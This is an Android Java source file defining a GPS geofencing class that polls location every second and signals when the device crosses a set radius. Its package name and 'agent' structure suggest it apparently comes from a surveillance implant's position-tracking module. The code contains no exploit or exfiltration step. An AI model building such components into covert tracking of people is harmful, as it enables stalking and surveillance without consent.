package com.ht.RCSAndroidGUI.agent.position;

import android.app.PendingIntent;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;

import com.ht.RCSAndroidGUI.Status;

public class GPSLocatorDistance extends GPSLocator implements LocationListener {
	private static final String TAG = "GPSLocDist";
	private float latitude;
	private float longitude;
	private float distance;
	private long expiration;
	private PendingIntent intent;
	private RangeObserver rangeListener;
	private Location location;

	boolean entered = false;

	public GPSLocatorDistance(RangeObserver listener, float latitude,
			float longitude, float distance) {
		
		super();
		
		this.rangeListener = listener;
		this.latitude = latitude;
		this.longitude = longitude;
		this.distance = distance;
		
		setListener(this);
	}

	@Override
	public void go(LocationListener listener, LocationManager lm) {
		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1L, this,
				Looper.getMainLooper());
	}

	public void onLocationChanged(Location location) {
		if (this.location == null) {
			this.location = new Location(location);
			this.location.setLatitude(latitude);
			this.location.setLongitude(longitude);
		}
		float actualDistance = this.location.distanceTo(location);
		if (actualDistance < distance) {
			if (!entered) {

				rangeListener.notification(true);
				entered = true;
			} else {
				Log.d(TAG, "Already entered");

			}
		} else {
			if (entered) {

				rangeListener.notification(false);
				entered = false;
			} else {
				Log.d(TAG, "Already exited");
			}

		}
	}

	public void onProviderDisabled(String arg0) {
		// TODO Auto-generated method stub

	}

	public void onProviderEnabled(String arg0) {
		// TODO Auto-generated method stub

	}

	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
		// TODO Auto-generated method stub

	}

}
